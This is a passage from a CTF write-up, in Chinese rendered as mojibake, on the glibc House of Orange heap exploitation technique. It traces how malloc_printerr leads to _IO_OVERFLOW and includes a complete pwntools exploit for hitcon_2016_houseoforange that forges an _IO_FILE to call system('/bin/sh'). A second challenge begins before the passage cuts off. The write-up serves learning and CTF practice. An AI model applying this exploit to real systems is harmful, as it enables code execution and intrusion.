<strong>ç»¼ä¸Šæ‰€è¿° ï¼Œ å½“æˆ‘ä»¬æ§åˆ¶top chunkçš„å¤§å°ä¸ºunsorted binçš„å¤§å°æ—¶ï¼Œå°±å¯ä»¥unsorted bin attact</strong></p>
<h2 id="malloc-printerr-æºç åˆ†æ"><a class="header-anchor" href="#malloc-printerr-æºç åˆ†æ">Â¶</a>malloc_printerr æºç åˆ†æ</h2>
<p>malloc_printerræ˜¯mallocä¸­ç”¨äºæç¤ºé”™è¯¯çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨__libc_message</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è·Ÿè¿›__libc_message,æœ€ç»ˆä¼šè°ƒç”¨abort()æ¥åˆ‡æ–­è¿›ç¨‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_abort)</span><br><span class="line">  &#123;</span><br><span class="line">    BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Kill the application.  */</span></span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è·Ÿè¿›,abroté‡Œé¢ä¼šè°ƒç”¨fflush</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (stage == 1)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (NULL);</span><br><span class="line">  &#125;c</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å¾—åˆ°ä¸€æ¡è°ƒç”¨é“¾<br>
_IO_fflush -&gt; _IO_flush_all -&gt; _IO_flush_all_lockp</p>
<p>_IO_flush_all_lockpä»_IO_list_allä½œä¸ºé“¾è¡¨å¤´è¿›è¡Œéå†ï¼Œä»¥å½“å‰èŠ‚ç‚¹ä½œä¸º _IO_OVERFLOWçš„å‚æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>_IO_OVERFLOWçš„å®šä¹‰å¦‚ä¸‹,å®ƒä¼šå»è°ƒç”¨__overflowå‡½æ•°ï¼Œè€Œ__overflowå‡½æ•°åˆå’Œ_IO_FILEé‡Œçš„å‡½æ•°ç›¸å…³</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬æœ€ç»ˆå¯ä»¥ä¼ªé€ IO_FILEç»“æ„ï¼Œå°±å¯ä»¥è¾¾åˆ°åŠ«æŒç¨‹åºæµçš„ç›®çš„</p>
<p>_IO_FILEç»“æ„å¦‚ä¸‹ï¼Œstruct _IO_FILE *_chainæ˜¯ä¸€ä¸ªç”¨äºæŒ‡å‘_IO_FILEä¸­ä¸‹ä¸€ä¸ªæˆå‘˜çš„æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>_IO_FILEä½œä¸ºä¸€ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œ_IO_list_allä½œä¸ºè¡¨å¤´ï¼Œåˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„unsorted bin<br>
åˆ™å¯ä»¥åŠ«æŒ_IO_list_allï¼Œå°†_IO_list_allçš„å€¼ä¼ªé€ ä¸ºmain_arena+88ã€‚æ­¤æ—¶main_arena+88<br>
ä½œä¸º_IO_FILEçš„å¤´ï¼Œä½†æ˜¯ç”±äºmain_arena+88æ˜¯ä¸å¯æ§çš„ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨æ­¤å¤„ä¼ªé€ ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡<br>
struct _IO_FILE <em>_chainå°†å…¶é“¾æ¥åˆ°ä¸€ä¸ªå¯æ§çš„åœ°æ–¹æ¥ä¼ªé€ æˆ‘ä»¬çš„_IO_FILEã€‚å½“è°ƒç”¨_IO_FILE<br>
æ—¶ï¼Œç”±äºmian_arena+88çš„æ•°æ®ä¸ç¬¦åˆï¼Œå°±ä¼šé€šè¿‡</em>_chainå»å‘åæœç´¢ï¼Œå½“æœç´¢åˆ°æˆ‘ä»¬ä¼ªé€ å¥½çš„<br>
_IO_FILEç»“æ„ä½“æ—¶å°±ä¼šè°ƒç”¨å…¶è™šè¡¨é‡Œçš„å‡½æ•°ã€‚</p>
<p>è€Œå¦‚æœå°†main_arena+88å¤„çœ‹ä½œä¸€ä¸ª_IO_FILEç»“æ„ä½“ï¼Œé‚£ä¹ˆstruct _IO_FILE *_chain<br>
æŒ‡é’ˆçš„ä½ç½®ä¸ºmain_arena+88+0x68ï¼Œè¯¥ä½ç½®åˆšå¥½æ˜¯0x60å¤§å°çš„small binç¬¬ä¸€ä¸ªchunkçš„åœ°å€ã€‚<br>
å¦‚æœå°†ä¼ªé€ å¥½çš„_IO_FILEç»“æ„ä½“å¸ƒç½®åœ¨é‚£é‡Œï¼Œé‚£ä¹ˆå½“ç¨‹åºæ‰§è¡Œ_IO_OVERFLOWæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒ<br>
ç¨‹åºæµ</p>
<p>é‚£ä¹ˆå¦‚ä½•å¾—åˆ°ä¸€ä¸ªå¤§å°ä¸º0x60çš„small binå‘¢ï¼Œåœ¨æ„é€ unsorted binçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å°†å…¶size<br>
è¦†ç›–ä¸º0x60ï¼Œè¿™æ ·åœ¨å‘ç”Ÿunsorted bin éå†æ—¶å°±ä¼šå°†è¿™ä¸ªunsorted bin é“¾å…¥åˆ°small binä¸­ï¼Œä»£<br>
ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<pre><code>åœ¨ä¼ªé€ _IO_FILEç»“æ„æ—¶éœ€è¦æ³¨æ„ä¸€ä¸‹å‡ ç‚¹
1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
</code></pre>
<h2 id="åˆ—é¢˜"><a class="header-anchor" href="#åˆ—é¢˜">Â¶</a>åˆ—é¢˜</h2>
<h3 id="hitcon-2016-houseoforange"><a class="header-anchor" href="#hitcon-2016-houseoforange">Â¶</a>hitcon_2016_houseoforange</h3>
<h4 id="IDAåˆ†æ"><a class="header-anchor" href="#IDAåˆ†æ">Â¶</a>IDAåˆ†æ</h4>
<p>build  é™¤äº†é™åˆ¶äº†ç”³è¯·æ¬¡æ•°ä¸º3å¤–æ²¡ä»€ä¹ˆç‰¹åˆ«çš„<br>
<img src="http://static.zybuluo.com/hgggg/1rppiar2k3d5r9q6vdluva12/11.png" alt="11.png-77.8kB"></p>
<p>æ¼æ´åœ¨updateä¸Š å¯ä»¥é€ æˆå †æº¢å‡ºï¼Œå¾—åˆ°unsorted bin<br>
<img src="http://static.zybuluo.com/hgggg/0hej1whkm528phy92uxta6qc/12.png" alt="12.png-66.3kB"></p>
<h4 id="Step1-ä¿®æ”¹top-chunk-size"><a class="header-anchor" href="#Step1-ä¿®æ”¹top-chunk-size">Â¶</a>Step1 ä¿®æ”¹top chunk size</h4>
<p><img src="http://static.zybuluo.com/hgggg/ji99l97thw1lo8txj2w6ft3z/13.png" alt="13.png-90.3kB"></p>
<p>å¯ä»¥çœ‹åˆ°top chunk çš„sizeä¸º0x21f81,<br>
è€Œç»è¿‡IDAåˆ†ææˆ‘ä»¬æœ€å¤§å¯ä»¥ç”³è¯·å¤§å°ä¸º0x1000å¤§å°çš„å †å—,<br>
å¯ä»¥åˆ©ç”¨å †æº¢å‡ºæ¥ä¿®æ”¹sizeä½ä¸º0xf81,æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<h4 id="Step2-unsorted-bin-attack-æ³„éœ²åœ°å€"><a class="header-anchor" href="#Step2-unsorted-bin-attack-æ³„éœ²åœ°å€">Â¶</a>Step2 unsorted bin attack æ³„éœ²åœ°å€</h4>
<p>æ¥ä¸‹æ¥ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„chunkçš„åˆ°unsorted bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/bgduyroukjb5oux25dfmyqvl/14.png" alt="14.png-64.1kB"><br>
å¯çœ‹åˆ°æˆ‘ä»¬çš„åˆ°äº†ä¸€ä¸ªunsorted binå¹¶ä¸”å…¶fd å’Œ bkæŒ‡é’ˆå‡æŒ‡å‘main_arena_88çš„ä½ç½®<br>
æ¥ä¸‹æ¥å°±æ˜¯çš„åˆ°unsorted bin ç”³è¯·chunk æ¥ libc_base å’Œ heap_addr äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²å †åœ°å€</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xE0</span></span><br></pre></td></tr></table></figure>
<h4 id="Step3-ä¼ªé€ -IO-FILEç»“æ„ä½“"><a class="header-anchor" href="#Step3-ä¼ªé€ -IO-FILEç»“æ„ä½“">Â¶</a>Step3 ä¼ªé€ _IO_FILEç»“æ„ä½“</h4>
<p><img src="http://static.zybuluo.com/hgggg/8v00ux1tq8602vb38j6t6ju0/15.png" alt="15.png-91.7kB"><br>
<img src="http://static.zybuluo.com/hgggg/m21uqe95v4smhqlw49ggw41g/16.png" alt="16.png-69.2kB"></p>
<p>æˆ‘ä»¬éœ€è¦å°†_IO_FIlEæŒ‰ç…§å‰é¢æ€»ç»“çš„æ–¹å¼ä¼ªé€ ï¼Œ<br>
å½“è§¦å‘mallocæ—¶ï¼Œglibcä¼šæ•´ç†unsorted binï¼ŒæŠŠå¯¹åº”sizeçš„chunkæ”¾å…¥smallbiné‡Œé¢<br>
ç”±äºæˆ‘ä»¬ç”³è¯·çš„chunkä¸å’Œæ³•ï¼Œä¼šè§¦å‘malloc_printerr ï¼Œéšå_IO_flush_all_lockpä¼šä»_IO_list_allæŒ‡å‘çš„FILEç»“æ„å¼€å§‹æŸ¥æ‰¾ï¼Œæ‰¾åˆ°åˆé€‚_IO_FILEä½œä¸º_IO_OVERFLOWçš„å‚æ•°ï¼Œæ‰§è¡Œvtableé‡Œé¢çš„å‡½æ•°ï¼ŒæŠŠIO_FILEç»“æ„ä½“æœ¬èº«ä½œä¸ºå‚æ•°<br>
è¿™æ—¶æˆ‘ä»¬åªè¦å°†__overflowè¦†ç›–æˆsystemï¼Œå¹¶åœ¨fake_IO_FILEä¸­å†™å…¥/bin/shåšä¸ºå‚æ•°å°±èƒ½getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#_IO_read_ptr = 0x60 (small bin [4])</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(<span class="number">0</span>) </span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>)<span class="comment">#vtableæŒ‡é’ˆ,åŒæ—¶ï¼Œä¹Ÿä½œä¸ºfake_vtableçš„__dummy è¿™é‡Œçš„0x5E8=0x510+0xC0+0x18</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span> <span class="comment">#__dummy2ã€__finish</span></span><br><span class="line">fake_file += p64(system_addr)<span class="comment">#è¦†ç›–__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment">#è§¦å‘malloc</span></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢æ˜¯è§¦å‘mallocå_IO_FILEçš„æƒ…å†µ<br>
<img src="http://static.zybuluo.com/hgggg/ml2vafj9lvudw6idwgn4yxj8/17.png" alt="17.png-161.9kB"><br>
<img src="http://static.zybuluo.com/hgggg/dbljk3vs6nsagkwu9xo0jnne/18.png" alt="18.png-99.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/q3w0yq81kitpr4og8h94bmpm/19.png" alt="19.png-56kB"><br>
æˆåŠŸget shell</p>
<h4 id="å®Œæ•´exp"><a class="header-anchor" href="#å®Œæ•´exp">Â¶</a>å®Œæ•´exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,25967)</span></span><br><span class="line">p = process(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;199&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;120&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">main_arena_88 = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">update(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ç¥¥äº‘æ¯2021-note"><a class="header-anchor" href="#ç¥¥äº‘æ¯2021-note">Â¶</a>ç¥¥äº‘æ¯2021_note</h3>
<h4 id="IDAåˆ†æ-v2"><a class="header-anchor" href="#IDAåˆ†æ-v2">Â¶</a>IDAåˆ†æ</h4>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/utb61irhn7pfb8divn1r5gcm/20.png" alt="20.png-47kB"></p>
<p>say<br>
<img src="http://static.zybuluo.com/hgggg/myib49627xjbzmxixn6uh05q/21.png" alt="21.png-27.8kB"></p>
<p>show<br>
<img src="http://static.zybuluo.com/hgggg/6vla2w4fpv4bnyi7a9oekzn9/22.png" alt="22.png-19.7kB"></p>
<h4 id="Step1æ³„éœ²å †åœ°å€"><a class="header-anchor" href="#Step1æ³„éœ²å †åœ°å€">Â¶</a>Step1æ³„éœ²å †åœ°å€</h4>
<p><s>è¿™ä¸ªä¸éš¾ï¼Œæœ‰æ‰‹å°±è¡Œ</s>ï¼Œç›´æ¥ä¸Šä»£ç </p>
